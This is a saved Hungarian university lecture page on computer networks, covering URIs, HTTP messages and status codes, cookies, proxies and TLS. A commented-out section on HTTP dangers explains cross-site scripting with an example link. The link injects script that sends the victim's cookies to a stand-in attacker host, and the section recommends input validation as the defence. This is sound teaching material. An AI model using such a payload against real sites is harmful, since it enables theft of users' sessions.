@@ -1,0 +1,963 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0048)http://users.itk.ppke.hu/~marta5/eloadas-13.html -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="hu" lang="hu"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Számítógépes hálózatok – 13. előadás</title>
+
+<meta name="generator" content="Org-mode">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="./Számítógépes hálózatok – 13. előadás_files/base-style.css">
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Számítógépes hálózatok – 13. előadás</h1>
+
+<p>
+</p><h2>A World Wide Web</h2>
+<h3>Történet</h3>
+<ul>
+<li>gopher...
+</li><li>CERN, 1990
+</li><li>Tim Berners-Lee, Robert Cailliau
+</li><li>NCSA, 1993, X-Mosaic
+</li><li>1995, Netscape
+</li><li>MIT, W3C
+</li></ul>
+<h3>Architektúra</h3>
+<ul>
+<li>kliens - browser/böngésző
+</li><li>szerver - httpd
+</li><li>HTML
+</li><li>URL
+</li><li>HTTP
+</li><li>dinamikus/statikus tartalom
+</li></ul>
+
+
+
+<p>
+</p><div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">URI, URN, URL</h2>
+<div class="outline-text-2" id="text-1">
+<ul class="org-ul">
+<li>URI - Unified Resource Identifier, <a href="http://tools.ietf.org/html/rfc3986">RFC3986</a>
+<ul class="org-ul">
+<li>Egy erőforrás (resource) azonosítása egy karaktersorozat által
+</li>
+<li>Szintakszis (hier = hierarchical):
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">URI         = scheme ":" hier-part [ "?" query ] [ "#" fragment ]
+</pre>
+
+
+<ul class="org-ul">
+<li>Reserved karakterek: ezek szolgálhatnak az egyes komponensek elválaszására
+</li>
+</ul>
+<pre class="example">reserved    = gen-delims / sub-delims
+
+  gen-delims  = :  /  ?  #  [  ]  @
+
+  sub-delims  = !  $  &amp;  '  (  ) *  +  ,  ;  =
+</pre>
+<ul class="org-ul">
+<li>Unreserved karakterek
+</li>
+</ul>
+<pre class="example">unreserved  = ALPHA / DIGIT / "-" / "." / "_" / "~"
+</pre>
+<ul class="org-ul">
+<li>Az URI-ban nem megengedett karaktereket kódoljuk
+<ul class="org-ul">
+<li>Ezek az <b>unsafe</b> karakterek:  <code>&lt;  &gt; %  | \</code> valamint minden nem ascii karakter és a space
+</li>
+</ul>
+</li>
+<li>A gyakorlatban az implementációk sokszor megengedőbbek
+<ul class="org-ul">
+<li>V.ö. Postel féle robosztusság elv
+</li>
+</ul>
+</li>
+</ul>
+
+<pre class="example">pct-encoded = "%" HEXDIG HEXDIG
+</pre>
+
+
+<ul class="org-ul">
+<li>URN - Unified Resource Name
+<ul class="org-ul">
+<li>Egy fajtája az URI-nak, ami valamilyen absztrakt, vagy konkrét dolog azonosítására szolgál
+</li>
+<li>Példák:
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">urn:ietf:rfc:3986
+urn:isbn:978-0-596-00868-0
+</pre>
+<ul class="org-ul">
+<li>URL - Unified Resource Locator
+<ul class="org-ul">
+<li>Egy fajtája az URI-nek, 
+ami
+ valamilyen erőforrás <b>helyét</b> azonosítja (<i>locus = hely</i> latinul)
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">ftp://user:password@domain:port/path/to/file
+</pre>
+
+<ul class="org-ul">
+<li>Kis és nagybetű a host névben és a séma nevében nem számít. Ezek ekvivalensek:
+</li>
+</ul>
+<pre class="example">http://abc.com:80/~smith/home.html
+HTTP://ABC.com/%7Esmith/home.html
+http://ABC.com:/%7esmith/home.html
+</pre>
+<ul class="org-ul">
+<li>Relatív URL: a környezettől függő alap-URL-hez képest fejezi  ki az erőforrás helyét
+</li>
+</ul>
+<pre class="example">http:images/sparrow.png
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">HTTP - <a href="http://tools.ietf.org/html/rfc2616">RFC2616</a></h2>
+<div class="outline-text-2" id="text-2">
+<ul class="org-ul">
+<li>A kurrens változat HTTP/1.1
+<ul class="org-ul">
+<li>HTTP/1.0 <a href="http://tools.ietf.org/html/rfc1945">RFC1945</a> még használható
+</li>
+<li>HTTP/2 <a href="http://tools.ietf.org/html/7540">RFC7540</a>: 2015. májusi – kezdő lépések a gyakorlatban
+</li>
+<li>1.0-ban egy TCP kapcsolat csak egy http kérés kiszolgálását teszi lehetővé
+</li>
+</ul>
+</li>
+<li>TCP feletti protokoll, alapértelmezésben 80-as porton
+</li>
+<li>Kliens/szerver architektúrán alapul
+</li>
+<li>Alapértelmezésben <b>egyetlen</b> kérés/válasz pár egy TCP kapcsolaton
+</li>
+<li>A HTTP önmagában <b>stateless</b>
+<ul class="org-ul">
+<li>A szerver nem tart fenn állapotot az egyes kliensekről, az átvitt adatokról stb.
+<ul class="org-ul">
+<li>Ez egyszerű és nagyszerű, de sokszor kevés, ezért kell <b>cookie</b>-kat bevezetni
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3">HTTP kérések és válaszok</h2>
+<div class="outline-text-2" id="text-3">
+<ul class="org-ul">
+<li>A kérések és válaszok szerkezete egyezik - <a href="http://tools.ietf.org/html/rfc822">RFC822</a> / <a href="http://tools.ietf.org/html/rfc2822">RFC2822</a>
+<ul class="org-ul">
+<li>Olvasható karakterekből álló sorok alkotják
+</li>
+<li>Kezdősor
+<ul class="org-ul">
+<li>Megmondja, hogy milyen kérés, vagy milyen válasz:
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">GET http://www.elte.hu/index.html HTTP/1.1
+</pre>
+
+<pre class="example">HTTP/1.1 404 Page Not Found
+</pre>
+<ul class="org-ul">
+<li>Fejrész
+<ul class="org-ul">
+<li>RFC822 szintakszis
+</li>
+<li>Minden sorban <code>attribútum: érték</code>
+</li>
+</ul>
+</li>
+<li>Egy üres sor
+</li>
+<li>Opcionális törzs
+</li>
+<li>A kérés első sora három részből áll:
+</li>
+</ul>
+<pre class="example">Method Request-URI HTTP-version
+</pre>
+<ul class="org-ul">
+<li>Az egyes elemeket space választja el
+</li>
+<li>A <code>Method</code> mindig csupa nagybetű
+</li>
+<li>A <code>Request-URI</code> lehet abszolút, vagy relatív
+</li>
+<li>Példa:
+</li>
+</ul>
+<pre class="example">GET http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1
+</pre>
+<ul class="org-ul">
+<li>A válasz első sora, a <b>status line</b> is három részből áll:
+</li>
+</ul>
+<pre class="example">HTTP-version Status-code Reason
+</pre>
+<ul class="org-ul">
+<li>Status-code
+<ul class="org-ul">
+<li>2xx - siker
+</li>
+<li>1xx - részleges siker
+</li>
+<li>3xx - átirányítás
+</li>
+<li>4xx - kliens hiba
+</li>
+<li>5xx - szerver hiba
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">100   Continue
+101   Switching Protocols
+200   OK
+201   Created
+202   Accepted
+203   Non-Authoritative Information
+204   No Content
+205   Reset Content
+206   Partial Content
+300   Multiple Choices
+301   Moved Permanently
+302   Found
+303   See Other
+304   Not Modified
+305   Use Proxy
+307   Temporary Redirect
+400   Bad Request
+401   Unauthorized
+402   Payment Required
+403   Forbidden
+404   Not Found
+405   Method Not Allowed
+406   Not Acceptable
+407   Proxy Authentication Required
+408   Request Time-out
+409   Conflict
+410   Gone
+411   Length Required
+412   Precondition Failed
+413   Request Entity Too Large
+414   Request-URI Too Large
+415   Unsupported Media Type
+416   Requested range not satisfiable
+417   Expectation Failed
+500   Internal Server Error
+501   Not Implemented
+502   Bad Gateway
+503   Service Unavailable
+504   Gateway Time-out
+505   HTTP Version not supported
+</pre>
+<ul class="org-ul">
+<li>A leggyakoribb HTTP kérés <code>GET</code>
+</li>
+</ul>
+
+<pre class="example">GET /wiki/Ajax_(Programmierung) HTTP/1.1
+Host: de.wikipedia.org
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.10) Gecko/20100623 Iceweasel/3.5.10 (like Firefox/3.5.10)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://en.wikipedia.org/wiki/Ajax_(programming)
+Pragma: no-cache
+Cache-Control: no-cache
+
+HTTP/1.0 200 OK
+Date: Wed, 06 Oct 2010 19:27:33 GMT
+Server: Apache
+Cache-Control: private, s-maxage=0, max-age=0, must-revalidate
+Content-Language: de
+Vary: Accept-Encoding,Cookie
+Last-Modified: Tue, 28 Sep 2010 01:39:47 GMT
+Content-Encoding: gzip
+Content-Length: 27759
+Content-Type: text/html; charset=UTF-8
+X-Cache: MISS from sq73.wikimedia.org
+X-Cache-Lookup: HIT from sq73.wikimedia.org:3128
+X-Cache: MISS from amssq36.esams.wikimedia.org
+X-Cache-Lookup: HIT from amssq36.esams.wikimedia.org:3128
+X-Cache: MISS from amssq42.esams.wikimedia.org
+X-Cache-Lookup: MISS from amssq42.esams.wikimedia.org:80
+Connection: keep-alive
+
+............ks$.u ....)hi
+</pre>
+
+<ul class="org-ul">
+<li>A kérésben nincs törzs, csak fejrész
+</li>
+<li>Figyelemreméltó, hogy az üzenet gzip-pel kódolva érkezik
+</li>
+<li><code>HEAD</code> kérés
+<ul class="org-ul">
+<li>Olyan, mint a <code>GET</code>, de csak a fejrészt adja vissza a szerver
+</li>
+</ul>
+</li>
+<li><code>POST</code> kérés
+<ul class="org-ul">
+<li>A kliens által küldött adatok feldolgozását kéri a szervertől
+</li>
+<li>Rendszerint egy HTML form kitöltésekor (submit)
+</li>
+<li>A kéréshez nem csak fejrész, hanem üzenet törzs is tartozik
+</li>
+</ul>
+</li>
+</ul>
+
+<pre class="example">POST /login.cgi HTTP/1.1
+Host: www.pelda.hu
+User-Agent: Mozilla/4.0
+Content-Length: 27
+Content-Type: application/x-www-form-urlencoded
+
+userid=en&amp;password=nicsakmi
+</pre>
+<ul class="org-ul">
+<li>A törzs rendszerint <code>Content-Type: application/x-www-form-urlencoded</code>
+</li>
+<li>URL encoding
+<ul class="org-ul">
+<li>Minden unsafe karaktert <code>%xx</code> alakra kódolunk
+<!--
+<ul class="org-ul">
+<li>Nem árt, ha többet is
+</li>
+<li>XSS-nél a gonosz kódban rendszerint kódolva vannak az olvasható részek is, hogy kevésbé lehessen felismerni a tartalmat
+</li>
+</ul>
+-->
+</li>
+<li>Minden space-t plusz jelre cserélünk
+</li>
+<li>Az paraméter=érték párokat egymás után írjuk és (&amp;) jellel elválasztva
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">userid=en&amp;password=nicsakmi
+</pre>
+<ul class="org-ul">
+<li>GET vs. POST
+<ul class="org-ul">
+<li>HTML form-oknál nem csak POST, hanem GET metódust (kérést) is használhatunk
+<ul class="org-ul">
+<li>Ez egy attíbútuma a HTML form-nak (<code>METHOD = "GET", METHOD = POST</code>)
+</li>
+</ul>
+</li>
+<li>GET-nél a url-encoded paraméterlistát az URL végére biggyesztjük
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">GET http://www.pelda.hu/login.cgi?userid=en&amp;password=nicsakmi HTTP/1.1
+</pre>
+<ul class="org-ul">
+<li>Akkor használjunk GET-et, ha a művelet idempotens
+<ul class="org-ul">
+<li>Egy <code>I</code> művelet idempotens, ha <code>I*I = I</code>
+</li>
+<li>Ha 'Reload'-ot kérünk, nincs különbség
+</li>
+<li>Tipikusan nem idempotens művelet, ha fizetünk a web lapon…
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-sec-4" class="outline-2">
+<h2 id="sec-4">Cookiek - HTTP state management mechanism <a href="http://tools.ietf.org/html/rfc2965">RFC2965</a></h2>
+<div class="outline-text-2" id="text-4">
+<ul class="org-ul">
+<li>A HTTP stateless tulajdonsága miatt van rá szükség
+</li>
+<li>A szerver tudni akarja, hogy milyen állapotban van a kliens
+</li>
+<li>Süt egy cookiet, amit majd később ő maga eszik meg
+<ul class="org-ul">
+<li>Ha más eszi meg, az bajt okozhat - (XSS)
+</li>
+</ul>
+</li>
+<li>A cookie egy fejrész elem amit a szerver küld a válaszban
+</li>
+<li>A kliens visszaküldi a szerverhez
+</li>
+<li>A szerver a kliensek cookie-jairól nyilvántartást vezet
+<ul class="org-ul">
+<li>Kulcs: IP cím, cookie, érték: állapot - pl. user név, kosár tartalma stb.
+</li>
+</ul>
+</li>
+<li>A kliens a szerverekhez tartozó cookie-król nyilvántartást vezet
+</li>
+</ul>
+
+<div class="figure">
+<p><img src="./Számítógépes hálózatok – 13. előadás_files/cook.png" alt="cook.png">
+</p>
+<p><span class="figure-number">Figure 1:</span> Firefox cookiek</p>
+</div>
+<ul class="org-ul">
+<li>A cookiek segítségével a szerver (a szerver gazdája) bekukucskálhat a gépünkbe
+<ul class="org-ul">
+<li>A HTTP kérésekben küldött információk segítségével is!
+</li>
+</ul>
+</li>
+<li>Az RFC ezt <a href="http://tools.ietf.org/html/rfc2965">írja</a>:
+</li>
+</ul>
+<pre class="example">6. PRIVACY
+
+
+   Informed consent should guide the design of systems that use cookies.
+   A user should be able to find out how a web site plans to use
+   information in a cookie and should be able to choose whether or not
+   those policies are acceptable.  Both the user agent and the origin
+   server must assist informed consent.
+</pre>
+<ul class="org-ul">
+<li>Mégis pl. sok banner jár együtt cookie-kkal
+<ul class="org-ul">
+<li>Nem a látogatott web helyről jön a cookie, hanem a reklámcégtől (pl. doubleclick, adverticum)
+</li>
+<li>A reklámcégnél pontosan tudhatják, hogy milyen lapokat látogattunk, mikre kerestünk stb.
+<ul class="org-ul">
+<li>Célzott reklám a cél (?)
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-5" class="outline-2">
+<h2 id="sec-5">HTTP/1.1 sajátságok</h2>
+<div class="outline-text-2" id="text-5">
+<ul class="org-ul">
+<li>Virtuális szerverek
+<ul class="org-ul">
+<li>Egyetlen IP címen sok web szervert lehet host-olni
+<ul class="org-ul">
+<li>A users.itk.ppke.hu-n jelenleg [2016. december]:
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">www-users:~$ ls -l /etc/apache2/sites-enabled/|wc -l
+103
+</pre>
+
+<ul class="org-ul">
+<li>A http kérésben ezért bevezették a <code>Host:</code> fejrész elemet
+<ul class="org-ul">
+<li>HTTP/1.1-ben kötelező
+</li>
+</ul>
+</li>
+</ul>
+
+<pre class="example">GET /images/baba.png HTTP/1.1
+Host: www.bioetika.hu
+</pre>
+<ul class="org-ul">
+<li>Chunked Transfer-encoding
+<ul class="org-ul">
+<li>A fejrész elemek között a <code>Content-length:</code> mutatja, hogy mekkora adatot küld a szerver
+</li>
+<li>Sokszor jó, ha a szerver (kliens) elkezdi küldeni az adatot, mielőtt tudná a teljes hosszát
+<ul class="org-ul">
+<li>Ilyen módon lehet pl. on-the-fly tömöríteni
+</li>
+</ul>
+</li>
+<li>Ezért bevezették a <code>Transfer-Encoding: chunked</code> fejrész elemet
+<ul class="org-ul">
+<li>Nem keverendő össze a <code>Content-transfer-encoding:</code> elemmel!
+</li>
+</ul>
+</li>
+<li>Ilyenkor darabokban (chunk) küldi az információt
+</li>
+<li>Minden darab egy egysoros hossz információval kezdődik. A hossz hexa szám.
+</li>
+<li>Az üzenet végét egy 0 hosszú chunk jelzi
+<ul class="org-ul">
+<li>Ez után következhetnek a header-hez hasonló footer sorok
+</li>
+</ul>
+</li>
+<li>Példa:
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">HTTP/1.1 200 OK
+Date: Fri, 31 Dec 1999 23:59:59 GMT
+Content-Type: text/plain
+Transfer-Encoding: chunked
+
+1a; ignore-stuff-here
+abcdefghijklmnopqrstuvwxyz
+10
+1234567890abcdef
+0
+some-footer: some-value
+another-footer: another-value
+[blank line here]
+</pre>
+<ul class="org-ul">
+<li>Perzisztens kapcsolatok
+<ul class="org-ul">
+<li>A http/1.1-ben egy TCP kapcsolaton több kérés/válasz pár is végbemehet
+<ul class="org-ul">
+<li>Sőt, egymás után több kérést is lehet küldeni, mielőtt a válasz megérkezett volna
+</li>
+<li>Ezért is fontos a <code>Content-length:</code> fejrész elem
+</li>
+</ul>
+</li>
+<li>Az üzeneteknek (kérésnek is válasznak is) része lehet  <code>Connection: close</code> fejrész elem
+<ul class="org-ul">
+<li>Ez után a TCP kapcsolat bomlik
+</li>
+<li>Ezért a HTTP protokoll továbbra is stateless!
+</li>
+<li>A perzisztens kapcsolat azonban megtakarítja az új TCP kapcsolat felépítését
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-sec-6" class="outline-2">
+<h2 id="sec-6">Proxy-k</h2>
+<div class="outline-text-2" id="text-6">
+<ul class="org-ul">
+<li>Az RFC  külön <a href="http://tools.ietf.org/html/rfc2616#section-8.1.3">fejezetben</a> ír erről
+</li>
+<li>A http proxy egy olyan program, ami szerverként és kliensként is működik
+</li>
+<li>A proxyk cache-elhetik a letöltött adatokat, ezzel sávszélességet kímélhetnek
+<ul class="org-ul">
+<li>A 90-es években az NIIF központ http proxyt üzemeltetett az akadémiai közösség számára
+</li>
+</ul>
+</li>
+<li>A proxyk szűrő, tiltó listákat tartalmazhatnak
+</li>
+<li>Népszerű http caching program a <a href="http://www.squid-cache.org/">squid</a>
+</li>
+<li>Az RFC transzparens proxynak nevezi az olyat, amelyik nem módosítja a kéréseket és válaszokat
+<ul class="org-ul">
+<li>A szabad wifi-hez hozzáférőket <a href="http://www.ex-parrot.com/~pete/upside-down-ternet.html">meglepő proxy</a> más értelemben az ;-)
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-sec-7" class="outline-2">
+<h2 id="sec-7">Dinamikus web lapok</h2>
+<div class="outline-text-2" id="text-7">
+<ul class="org-ul">
+<li>Külön programozási nyelvek keletkeztek dinamikus web lapok létrehozására
+<ul class="org-ul">
+<li>Ezekről jó kurzusok vannak itt az egyetemen, pl. <a href="https://wiki.itk.ppke.hu/twiki/bin/view/PPKE/WebProgramozas">Web programozás</a>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<!--
+<div id="outline-container-sec-8" class="outline-2">
+<h2 id="sec-8">AJAX - Asynchronous Javascript And XML</h2>
+<div class="outline-text-2" id="text-8">
+<ul class="org-ul">
+<li>Az <code>XMLHttpRequest</code> javascript objektumon alapul
+</li>
+<li>Nem csak akkor mennek http kérések a szerver felé, amikor a felhasználó kattint
+</li>
+<li>A javascript kód a felhasználó háta mögött (aszinkron módon) kommunikál a szerverrel
+</li>
+<li>A technológia nem csak Javascript+XML-lel hanem pl. kliens oldali flash-sel vagy Java-val is használható
+</li>
+</ul>
+</div>
+</div>
+-->
+<!--
+<div id="outline-container-sec-9" class="outline-2">
+<h2 id="sec-9">HTTP veszélyek</h2>
+<div class="outline-text-2" id="text-9">
+<ul class="org-ul">
+<li>Phishing
+<ul class="org-ul">
+<li>Gyakran a felhasználó látszólag pl. egy bank webhelyén jár, de csalók áldozata lett
+<ul class="org-ul">
+<li>Pl. rákattint egy linkre, ami a www.kedvencbankom.hu helyett a www.kedvencbamkom.hu-ra vezet
+</li>
+<li>SSL/TLS  <b>tudatos</b>, és <b>óvatos</b> használata védelmet jelenthet
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>XSS - Cross Site Scripting
+<ul class="org-ul">
+<li>Gyakran a webhelyek visszaküldik a user inputot
+<ul class="org-ul">
+<li>A form-ban megkapott paramétereket visszaírják (v.ö. HTML gyakorlat harmadévben)
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="example">GET /welcome.cgi?ki=Pista&amp;hol=Pest HTTP/1.1
+</pre>
+<ul class="org-ul">
+<li>Erre a szkript kiírja
+</li>
+</ul>
+
+<pre class="example">&lt;html&gt;
+...
+
+&lt;b&gt;Szia Pista! Pest szép hely!&lt;/b&gt;
+</pre>
+
+<ul class="org-ul">
+<li>Ha egy gonosz támadó ráveszi Pistát, hogy rákattintson egy ilyen linkre:
+</li>
+</ul>
+<pre class="example">http://www.hibashely.hu/welcome.cgi?ki=&lt;script&gt;window.open("http://www.tamado.hu/collect.cgi?cookie="%2Bdocoment.cookie)&lt;/script&gt;
+</pre>
+<ul class="org-ul">
+<li>Pista összes hibashely.hu-val kapcsolatos cookie-ja a tamado.hu gazdájának birtokába jutott
+</li>
+<li>Védekezés: szigorúan ellenőrizni kell a user inputot, nem szabad benne megengedni szkriptet
+<ul class="org-ul">
+<li>Figyelni kell, hogy %xx alakban kódolhatják az egészet, ezt is meg kell akadályozni!
+</li>
+</ul>
+</li>
+<li>Egy nemrég megjelent <a href="http://www.skullsecurity.org/blog/?p=433">cikk</a> arra hívja fel a figyelmet, hogy DNS válaszok is XSS veszélyt jelenthetnek
+</li>
+</ul>
+</div>
+</div>
+-->
+
+<div id="outline-container-sec-10" class="outline-2">
+<h2 id="sec-10">SSL/TLS - <a href="http://tools.ietf.org/html/rfc5246">RFC5246</a></h2>
+<div class="outline-text-2" id="text-10">
+<ul class="org-ul">
+<li>Bővebben: kriptográfia órán
+</li>
+<li>Eredetileg a Netscape (klasszikus böngésző) találmánya: SSL = Secure Socket Layer
+</li>
+<li>Az IETF átvette és átnevezte: TLS = Transport Layer Security
+<ul class="org-ul">
+<li>A TLS 1.0 lényegében SSL 3.0
+</li>
+</ul>
+</li>
+<li>A TLS az alkalmazás (pl. http) és a transzport réteg (pl. TCP) közé ékelődik
+</li>
+</ul>
+
+
+<div class="figure">
+<p><img src="./Számítógépes hálózatok – 13. előadás_files/tls.png" alt="tls.png">
+</p>
+<p><span class="figure-number">Figure 2:</span> TLS az ISO/OSI architektúrában</p>
+</div>
+<ul class="org-ul">
+<li>A partner autentikálására nyilvános kulcsú titkosítást használ
+<ul class="org-ul">
+<li>HTTP-nél általában csak a szervert, de lehetőség van a kliens TLS azonosítására is
+</li>
+</ul>
+</li>
+<li>A partnerek egy shared secret-et beszélnek meg, és
+</li>
+<li>TLS titkosítja az adatfolyamot mindkét irányban
+</li>
+<li>A TCP csekkszummánál erősebb integritás ellenőrzést ad az adatfolyamnak
+<ul class="org-ul">
+<li>HMAC - Hashed Authenticity Code
+</li>
+</ul>
+</li>
+<li>TLS handshake protokoll
+<ul class="org-ul">
+<li>A partnerek megegyeznek a kriptográfiai algoritmusokban és paraméterekben
+</li>
+<li>Kicserélik és ellenőrzik a certificate-e(eke)t
+</li>
+<li>Véletlen számokból 'master secret-et' generálnak
+</li>
+<li>A TLS record réteg számára paramétereket adnak át
+<ul class="org-ul">
+<li>Rendszeresen cserélik a titkosításra használt kulcsot
+</li>
+</ul>
+</li>
+<li>A kliens 'Client hello' üzenettel köszön
+<ul class="org-ul">
+<li>Közli, hogy milyen protokollt fog használni (pl. SSL vagy TLS)
+</li>
+<li>Közli, hogy milyen algoritmusokat támogat
+</li>
+</ul>
+</li>
+<li>A szerver 'Server hello' üzenettel válaszol
+<ul class="org-ul">
+<li>A ,,legnagyobb közös osztó'' lesz a használt protokoll…
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>TLS record protokoll
+<ul class="org-ul">
+<li>Az átküldendő üzenetet
+<ul class="org-ul">
+<li>Darabolja
+</li>
+<li>Tömöríti
+</li>
+<li>HMAC-ot számol
+</li>
+<li>Titkosít
+</li>
+<li>Átküldi az üzenetet
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+<div id="outline-container-sec-10-1" class="outline-3">
+<h3 id="sec-10-1">TLS változatok</h3>
+<div class="outline-text-3" id="text-10-1">
+<ul class="org-ul">
+<li>A legtöbb eszköz 2014. októberéig elfogadta az SSL-t is
+<ul class="org-ul">
+<li>2014. októberében napvilágra került a <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3566">poodle</a> sérülékenység
+</li>
+<li>Man in the Middle támadást lehet végrehajtani SSL beszélgetőpartnerek
+között
+</li>
+<li>Jó teszt: <a href="https://www.ssllabs.com/">https://www.ssllabs.com/</a>
+</li>
+</ul>
+</li>
+<li>A kurrens változat: TLS 1.2
+<ul class="org-ul">
+<li>A fő változás, hogy a gyenge MD5 és SHA-1 algoritmusokat kiküszöböli
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</div>
+
+<!--
+<div id="outline-container-sec-11" class="outline-2">
+<h2 id="sec-11">Olvasnivaló</h2>
+<div class="outline-text-2" id="text-11">
+<ul class="org-ul">
+<li><a href="http://www.redbooks.ibm.com/redbooks/pdfs/gg243376.pdf">IBM redbook, 16. fejezet</a>
+</li>
+<li>Forousan könyv http fejezet
+</li>
+<li>Forousan könyv SSL/TLS fejezet
+</li>
+</ul>
+</div>
+</div>
+-->
+</div>
+<!--
+<div id="postamble" class="status">
+<p class="date">Dátum: <span class="timestamp-wrapper"><span class="timestamp">[2015-12-07 Mon]</span></span></p>
+<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.4.1 (<a href="http://orgmode.org/">Org</a> mode 8.2.10)</p>
+<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+-->
+
+
+</body></html>
